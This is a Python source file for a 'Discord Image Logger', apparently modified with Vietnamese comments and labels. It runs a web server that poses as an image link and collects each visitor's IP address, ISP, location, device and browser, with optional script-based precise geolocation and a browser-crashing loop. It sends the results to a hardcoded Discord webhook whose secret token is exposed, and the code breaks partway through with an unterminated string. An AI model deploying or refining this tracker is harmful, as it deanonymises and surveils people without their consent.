# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
from PIL import ImageGrab  # Thư viện để chụp ảnh màn hình
import traceback, requests, base64, httpagentparser, os
from discord import Embed, File, SyncWebhook  # Thêm import đầy đủ

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1359382890751725588/c-jxRmgOQPZN4_QvA8J5jhDnubu80Gixs6eDEuDA18X2638IpxRgWb-pS6vX9vlE_iMB",
    "image": "https://scontent.fhan3-2.fna.fbcdn.net/v/t39.30808-1/506490192_634777092950245_3747398490066748014_n.jpg?stp=dst-jpg_s100x100_tt6&_nc_cat=107&ccb=1-7&_nc_sid=e99d92&_nc_ohc=tk_Er6vxrT4Q7kNvwFrtOMy&_nc_oc=AdkSHVd-Gu62QWxXNDYXVCQNR7V5BIi1nIg3wPeyWBQhc55bszZZauvXOZyOUA14aCu7w1xnA8XZthPhsDely1On&_nc_zt=24&_nc_ht=scontent.fhan3-2.fna&_nc_gid=ylIxKnzAF9uz8dNDrJ6Tsg&oh=00_AfO4q7VwIL4arOSyqPWMeCAtNmtS1IvY6bUwk8bW_JHW2g&oe=6866AEED",
    "imageArgument": True,
    "username": "PIG VIRUS",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    # Thêm tùy chọn chụp ảnh màn hình
    "captureScreenshot": True  # Bật/tắt chụp ảnh màn hình
}

blacklistedIPs = ("27", "104", "143", "164")

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    webhook = SyncWebhook.from_url(config["webhook"])
    embed = Embed(title="Image Logger - Error", color=config["color"])
    embed.description = f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"
    webhook.send(content="@everyone", embed=embed)

def capture_screenshot(filename="screenshot.png"):
    try:
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(filename)
        return filename
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        webhook = SyncWebhook.from_url(config["webhook"])
        embed = Embed(title="Image Logger - Link Sent", color=config["color"])
        embed.description = f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"
        webhook.send(embed=embed)
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except requests.RequestException:
        info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", "mobile": False, "proxy": False, "hosting": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        elif config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info["proxy"]:
            return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2 and not info["proxy"]:
            ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "Unknown")
    webhook = SyncWebhook.from_url(config["webhook"])
    embed = Embed(title="PIG VIRUS", color=config["color"])
    embed.description = f"""**Một Thằng Ngu Đã Dính Bẫy**

**Endpoint:** `{endpoint}`

**IP Nạn Nhân:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Nhà Cung Cấp:** `{info['isp']}`
> **ASN:** `{info['as']}`
> **Quốc Gia:** `{info['country']}`
> **Vùng:** `{info['regionName']}`
> **Thành Phố:** `{info['city']}`
> **Tọa Độ:** `{f"{info['lat']}, {info['lon']}" if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map+'+coords+')'})
> **Múi Giờ:** `{info['timezone'].split('/')[1].replace('_', ' ') if '/' in info['timezone'] else info['timezone']} ({info['timezone'].split('/')[0] if '/' in info['timezone'] else 'Unknown'})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**Thông Tin Thiết Bị:**
> **Hệ Điều Hành:** `{os_name}`
> **Trình Duyệt:** `{browser}`

**User Agent:**
    if url:
        embed.set_thumbnail(url=url)

    # Tích hợp chụp ảnh màn hình
    screenshot_file = None
    if config["captureScreenshot"]:
        screenshot_file = capture_screenshot()
        if screenshot_file:
            embed.set_image(url="attachment://screenshot.png")

    if screenshot_file:
        with open(screenshot_file, "rb") as f:
            webhook.send(content=ping, embed=embed, file=File(f, "screenshot.png"), username=config["username"])
        os.remove(screenshot_file)
    else:
        webhook.send(content=ping, embed=embed, username=config["username"])

    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url") or dic.get("id", "").encode()).decode() if dic.get("url") or dic.get("id") else config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{margin: 0; padding: 0;}}
div.img {{background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh;}}</style><div class="img"></div>'''.encode()

            ip = self.headers.get('x-forwarded-for')
            if ip and ip.startswith(blacklistedIPs):
                return

            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                return

            dic = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            if config["accurateLocation"] and dic.get("g"):
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(ip, self.headers.get('user-agent'), location, self.path.split("?")[0], url=url)
            else:
                result = makeReport(ip, self.headers.get('user-agent'), endpoint=self.path.split("?")[0], url=url)

            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                message = message.format(ip=ip, isp=result["isp"], asn=result["as"], country=result["country"], region=result["regionName"], city=result["city"], lat=result["lat"], long=result["lon"], timezone=result["timezone"], mobile=result["mobile"], vpn=result["proxy"], bot=result["hosting"], browser=httpagentparser.simple_detect(self.headers.get('user-agent'))[1], os=httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

            datatype = 'text/html'
            if config["message"]["doMessage"]:
                data = message.encode()
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI

# Chạy server (thêm nếu bạn muốn chạy trực tiếp)
if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(('localhost', 8000), ImageLoggerAPI)
    print("Server running on http://localhost:8000")
    server.serve_forever()
